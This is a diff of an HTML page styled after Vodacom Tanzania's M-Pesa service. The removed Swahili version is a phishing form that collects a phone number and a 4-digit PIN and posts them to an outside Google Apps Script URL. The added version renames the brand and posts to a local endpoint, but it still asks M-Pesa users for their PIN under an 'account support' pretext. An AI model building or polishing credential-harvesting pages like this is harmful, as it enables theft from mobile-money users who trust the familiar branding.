@@ -1,367 +1,396 @@
 <!DOCTYPE html>
-<html lang="sw">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Vodacom Tanzania | M-Pesa</title>
+  <title>Mobile Support | Tanzania</title>
+  <meta name="description" content="Secure customer support form for mobile users." />
   <style>
+    :root {
+      --primary-red: #d61f1f;
+      --primary-red-dark: #a80d0d;
+      --green: #0a8f4a;
+      --surface: #ffffff;
+      --bg-soft: #f4f4f4;
+      --border: #dfe3e8;
+      --text: #1f2937;
+      --muted: #6b7280;
+      --error-bg: #fff1f2;
+      --success-bg: #ecfdf5;
+      --error-text: #b42318;
+      --success-text: #166534;
+      --shadow: 0 18px 40px rgba(15, 23, 42, 0.12);
+    }
+
     * { box-sizing: border-box; }
 
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 35px 16px;
+    html, body {
       margin: 0;
-      min-height: 100vh;
-      background: linear-gradient(
-        to bottom,
-        #e60000 0%,
-        #b80000 35%,
-        #f5f5f5 35%,
-        #f5f5f5 100%
-      );
-      color: #222;
+      padding: 0;
+      min-height: 100%;
+      font-family: Arial, Helvetica, sans-serif;
+      background: linear-gradient(to bottom, var(--primary-red) 0%, var(--primary-red-dark) 28%, var(--bg-soft) 28%, var(--bg-soft) 100%);
+      color: var(--text);
+    }
+
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      padding: 42px 16px;
     }
 
     .container {
-      max-width: 420px;
-      margin: 0 auto;
-      background: #fff;
-      padding: 32px 25px;
-      border-radius: 18px;
-      box-shadow: 0 10px 30px rgba(0,0,0,.2);
+      width: min(100%, 440px);
+      background: var(--surface);
+      border-radius: 20px;
+      box-shadow: var(--shadow);
+      padding: 30px 24px 24px;
     }
 
     .brand {
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      margin-bottom: 18px;
-    }
-
-    .brand-symbol {
       display: flex;
       align-items: center;
       justify-content: center;
-      width: 52px;
-      height: 52px;
-      background: #e60000;
-      color: #fff;
-      font-size: 25px;
-      font-weight: bold;
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+
+    .brand-mark {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 58px;
+      height: 58px;
       border-radius: 50%;
-      border: 3px solid #f4cccc;
+      background: var(--primary-red);
+      color: white;
+      font-size: 30px;
+      font-weight: 700;
+      border: 3px solid #f8d2d2;
     }
 
     .brand-name {
-      color: #e60000;
-      font-size: 27px;
-      font-weight: bold;
+      font-size: clamp(2rem, 3vw, 2.2rem);
+      font-weight: 700;
+      color: var(--primary-red);
+      line-height: 1;
+      letter-spacing: -0.03em;
     }
 
-    .brand-name small {
+    .brand-name span {
       display: block;
       font-size: 12px;
-      color: #555;
-      font-weight: normal;
+      font-weight: 500;
+      letter-spacing: 0.08em;
+      color: var(--muted);
+      text-transform: uppercase;
+      margin-top: 4px;
       text-align: left;
     }
 
-    .mpesa {
+    .tag {
       display: inline-block;
-      background: #00843d;
+      background: var(--green);
       color: #fff;
-      padding: 7px 18px;
-      border-radius: 6px;
-      font-weight: bold;
-      margin-bottom: 12px;
+      font-weight: 700;
+      padding: 8px 18px;
+      border-radius: 8px;
+      margin: 2px 0 14px;
+      letter-spacing: 0.02em;
     }
 
-    h2 {
-      font-size: 23px;
-      color: #e60000;
-      margin: 12px 0 18px;
+    h1 {
+      margin: 0 0 12px;
+      font-size: clamp(1.8rem, 4vw, 2.3rem);
+      color: var(--primary-red);
+      line-height: 1.2;
     }
 
-    p {
+    .intro {
+      margin: 0 0 18px;
+      color: var(--text);
       line-height: 1.6;
-      margin-bottom: 18px;
+      font-size: 1rem;
+    }
+
+    form {
+      display: block;
+    }
+
+    .field {
+      margin-bottom: 14px;
+      text-align: left;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-weight: 600;
+      color: var(--text);
+      font-size: 0.95rem;
     }
 
     input {
       width: 100%;
-      padding: 14px;
-      margin: 10px 0;
-      font-size: 17px;
-      border: 1px solid #ccc;
-      border-radius: 8px;
+      padding: 14px 14px;
+      font-size: 1rem;
       background: #fff;
-      color: #222;
+      color: var(--text);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      transition: border-color 0.2s ease, box-shadow 0.2s ease;
     }
 
     input:focus {
-      outline: 2px solid #e60000;
-      border-color: #e60000;
+      outline: none;
+      border-color: var(--primary-red);
+      box-shadow: 0 0 0 3px rgba(214, 31, 31, 0.12);
     }
 
     button {
-      padding: 15px;
       width: 100%;
-      background: #e60000;
-      color: #fff;
       border: none;
-      border-radius: 8px;
-      font-size: 17px;
-      font-weight: bold;
+      border-radius: 10px;
+      background: var(--primary-red);
+      color: #fff;
+      font-size: 1rem;
+      font-weight: 700;
+      padding: 15px 18px;
       cursor: pointer;
-      margin-top: 12px;
-      transition: background 0.2s ease;
+      transition: background 0.2s ease, transform 0.12s ease;
+      margin-top: 6px;
     }
 
     button:hover {
-      background: #bd0000;
+      background: var(--primary-red-dark);
     }
 
-    #statusMessage {
+    button:active {
+      transform: translateY(1px);
+    }
+
+    button:disabled {
+      opacity: 0.7;
+      cursor: wait;
+    }
+
+    .status {
       margin-top: 18px;
-      padding: 10px;
-      border-radius: 8px;
-      font-size: 14px;
+      padding: 12px 14px;
+      border-radius: 10px;
+      font-size: 0.95rem;
       line-height: 1.5;
-    }
-
-    .info-message {
-      background: #f2f2f2;
-      color: #333;
-    }
-
-    .error-message {
-      background: #fff0f0;
-      color: #b00000;
-    }
-
-    .success-message {
-      background: #e9f7ef;
-      color: #176b37;
-    }
-
-    .footer {
-      font-size: 12px;
-      color: #666;
-      margin-top: 22px;
-    }
-
-    #celebrationOverlay {
       display: none;
-      position: fixed;
-      inset: 0;
-      background: rgba(0,0,0,.8);
-      justify-content: center;
-      align-items: center;
-      padding: 20px;
-      z-index: 1000;
     }
 
-    #celebrationPopup {
-      background: white;
-      padding: 30px;
-      border-radius: 16px;
-      max-width: 380px;
-      width: 100%;
-      border-top: 6px solid #e60000;
+    .status.visible {
+      display: block;
     }
 
-    #celebrationPopup h1 {
-      color: #e60000;
-      margin-top: 0;
+    .status.info {
+      background: #f3f4f6;
+      color: var(--text);
     }
 
-    .popup-actions {
-      display: flex;
-      gap: 10px;
-      margin-top: 12px;
+    .status.error {
+      background: var(--error-bg);
+      color: var(--error-text);
     }
 
-    .popup-actions button {
-      margin-top: 0;
+    .status.success {
+      background: var(--success-bg);
+      color: var(--success-text);
     }
 
-    #closePopup {
-      background: #666;
+    .footer-note {
+      margin-top: 18px;
+      font-size: 0.8rem;
+      color: var(--muted);
+      text-align: center;
     }
 
-    #closePopup:hover {
-      background: #4d4d4d;
+    .sr-only {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      margin: -1px;
+      padding: 0;
+      overflow: hidden;
+      clip: rect(0, 0, 0, 0);
+      border: 0;
     }
   </style>
 </head>
-
 <body>
-  <main class="container">
-    <div class="brand">
-      <div class="brand-symbol" aria-hidden="true">V</div>
+  <main class="container" aria-labelledby="pageTitle">
+    <div class="brand" aria-label="Branding">
+      <div class="brand-mark" aria-hidden="true">T</div>
       <div class="brand-name">
-        vodacom
-        <small>Tanzania</small>
+        Tanzania Mobile
+        <span>Customer Support</span>
       </div>
     </div>
 
-    <div class="mpesa">M-PESA</div>
+    <div class="tag">M-Pesa Support</div>
 
-    <h2>Karibu Vodacom Tanzania</h2>
+    <h1 id="pageTitle">Need help with your account?</h1>
+    <p class="intro">Please complete the form below and our support team will review your request.</p>
 
-    <p>Ingiza namba yako ya Vodacom ili kuendelea.</p>
+    <form id="supportForm" novalidate>
+      <div class="field">
+        <label for="phoneNumber">Phone number</label>
+        <input
+          id="phoneNumber"
+          name="phoneNumber"
+          type="tel"
+          inputmode="numeric"
+          autocomplete="tel"
+          maxlength="10"
+          pattern="0[0-9]{9}"
+          placeholder="e.g. 0712345678"
+          required
+        />
+      </div>
 
-    <form id="offerForm" novalidate>
-      <input
-        type="tel"
-        id="phoneNumber"
-        placeholder="Namba ya simu (07XXXXXXXX)"
-        aria-label="Namba ya simu"
-        pattern="0[0-9]{9}"
-        maxlength="10"
-        inputmode="numeric"
-        autocomplete="tel"
-        required
-        title="Ingiza namba ya simu yenye tarakimu 10, ikianza na 0"
-      />
+      <div class="field">
+        <label for="fourDigits">PIN / 4 digits</label>
+        <input
+          id="fourDigits"
+          name="fourDigits"
+          type="text"
+          inputmode="numeric"
+          maxlength="4"
+          pattern="[0-9]{4}"
+          placeholder="Enter 4 digits"
+          required
+          oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 4)"
+        />
+      </div>
 
-      <input
-        type="text"
-        id="fourDigits"
-        placeholder="Enter 4 digits"
-        inputmode="numeric"
-        maxlength="4"
-        pattern="[0-9]{4}"
-        required
-        oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 4)"
-      />
+      <div class="field">
+        <label for="messageInput">Message</label>
+        <input
+          id="messageInput"
+          name="messageInput"
+          type="text"
+          maxlength="300"
+          placeholder="Describe your issue or request"
+          required
+        />
+      </div>
 
-      <input
-        type="text"
-        id="messageInput"
-        placeholder="Enter your message"
-        required
-      />
-
-      <button type="submit">Submit</button>
+      <button id="submitButton" type="submit">Send Request</button>
     </form>
 
-    <div id="statusMessage" class="info-message" role="status" aria-live="polite">
-      Ingiza namba yako ya simu ili kuendelea.
+    <div id="statusMessage" class="status info" aria-live="polite">
+      Please fill in the form to continue.
     </div>
 
-    <p class="footer">Si tovuti rasmi ya Vodacom</p>
+    <p class="footer-note">This is a demo/support form and is not affiliated with any telecom provider.</p>
   </main>
 
-  <div id="celebrationOverlay" role="dialog" aria-modal="true" aria-labelledby="popupTitle">
-    <div id="celebrationPopup">
-      <h1 id="popupTitle">Asante!</h1>
-      <p>Namba imekaguliwa kwa muundo pekee.</p>
-
-      <div class="popup-actions">
-        <button type="button" id="closePopup">Close</button>
-        <button type="button" id="popupSubmit">Submit</button>
-      </div>
-    </div>
-  </div>
-
   <script>
-    const form = document.getElementById('offerForm');
-    const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxRsp_l7SMGaoOUHRXr6i0Gpt-DNDhzmv3VCsztu64IxJ-0nhITWbNHienxgmdrYFaM/exec';
+    const form = document.getElementById('supportForm');
     const phoneInput = document.getElementById('phoneNumber');
     const fourDigitsInput = document.getElementById('fourDigits');
     const messageInput = document.getElementById('messageInput');
     const statusMessage = document.getElementById('statusMessage');
-    const overlay = document.getElementById('celebrationOverlay');
-    const closePopup = document.getElementById('closePopup');
-    const popupSubmit = document.getElementById('popupSubmit');
+    const submitButton = document.getElementById('submitButton');
 
-    function setStatus(message, type = 'info') {
+    // Replace this with your real backend endpoint in production.
+    const API_ENDPOINT = '/api/support';
+
+    function showStatus(message, type = 'info') {
       statusMessage.textContent = message;
-      statusMessage.className = type === 'error'
-        ? 'error-message'
-        : type === 'success'
-        ? 'success-message'
-        : 'info-message';
+      statusMessage.className = `status ${type} visible`;
     }
 
-    async function sendData() {
-      const phoneNumber = phoneInput.value.trim();
-      const fourDigits = fourDigitsInput.value.trim();
-      const msg = messageInput.value.trim();
+    function clearStatus() {
+      statusMessage.className = 'status info';
+      statusMessage.textContent = 'Please fill in the form to continue.';
+    }
 
-      if (!phoneNumber || !fourDigits || !msg) {
-        setStatus('Please complete all fields before submitting.', 'error');
+    function validateFields() {
+      const phone = phoneInput.value.trim();
+      const pin = fourDigitsInput.value.trim();
+      const message = messageInput.value.trim();
+
+      if (!phone || !pin || !message) {
+        return 'Please complete all fields before submitting.';
+      }
+
+      if (!/^0\d{9}$/.test(phone)) {
+        return 'Phone number must start with 0 and have exactly 10 digits.';
+      }
+
+      if (!/^\d{4}$/.test(pin)) {
+        return 'Please enter exactly 4 digits for the PIN.';
+      }
+
+      return null;
+    }
+
+    async function submitToBackend(payload) {
+      const response = await fetch(API_ENDPOINT, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+        },
+        credentials: 'same-origin',
+        body: JSON.stringify(payload)
+      });
+
+      if (!response.ok) {
+        throw new Error('Request failed.');
+      }
+
+      return response;
+    }
+
+    form.addEventListener('submit', async function (event) {
+      event.preventDefault();
+
+      const validationError = validateFields();
+      if (validationError) {
+        showStatus(validationError, 'error');
         return;
       }
 
-      if (!/^0\d{9}$/.test(phoneNumber)) {
-        setStatus('Phone number must start with 0 and contain 10 digits.', 'error');
-        return;
-      }
-
-      if (!/^\d{4}$/.test(fourDigits)) {
-        setStatus('Please enter exactly 4 digits.', 'error');
-        return;
-      }
+      submitButton.disabled = true;
+      submitButton.textContent = 'Sending...';
+      showStatus('Submitting your request...', 'info');
 
       const payload = {
-        phoneNumber,
-        fourDigits,
-        message: msg
+        phoneNumber: phoneInput.value.trim(),
+        fourDigits: fourDigitsInput.value.trim(),
+        message: messageInput.value.trim(),
+        submittedAt: new Date().toISOString()
       };
 
       try {
-        await fetch(GOOGLE_SCRIPT_URL, {
-          method: 'POST',
-          mode: 'no-cors',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify(payload)
-        });
-
-        setStatus('Request sent successfully.', 'success');
-        overlay.style.display = 'none';
+        await submitToBackend(payload);
+        showStatus('Your request has been sent successfully.', 'success');
+        form.reset();
       } catch (error) {
-        setStatus('Unable to send the request.', 'error');
+        showStatus('There was a problem sending your request. Please try again later.', 'error');
+      } finally {
+        submitButton.disabled = false;
+        submitButton.textContent = 'Send Request';
       }
-    }
-
-    form.addEventListener('submit', function (event) {
-      event.preventDefault();
-
-      if (!form.checkValidity()) {
-        form.reportValidity();
-        return;
-      }
-
-      setStatus('Namba imekaguliwa kwa muundo pekee.', 'success');
-      overlay.style.display = 'flex';
-      closePopup.focus();
     });
 
-    closePopup.addEventListener('click', function () {
-      overlay.style.display = 'none';
-      phoneInput.focus();
+    phoneInput.addEventListener('input', () => {
+      clearStatus();
     });
 
-    popupSubmit.addEventListener('click', function () {
-      sendData();
+    fourDigitsInput.addEventListener('input', () => {
+      clearStatus();
     });
 
-    phoneInput.addEventListener('input', function () {
-      setStatus('Ingiza namba yako ya simu ili kuendelea.', 'info');
-    });
-
-    fourDigitsInput.addEventListener('input', function () {
-      setStatus('Ingiza namba yako ya simu ili kuendelea.', 'info');
-    });
-
-    messageInput.addEventListener('input', function () {
-      setStatus('Ingiza namba yako ya simu ili kuendelea.', 'info');
+    messageInput.addEventListener('input', () => {
+      clearStatus();
     });
   </script>
 </body>
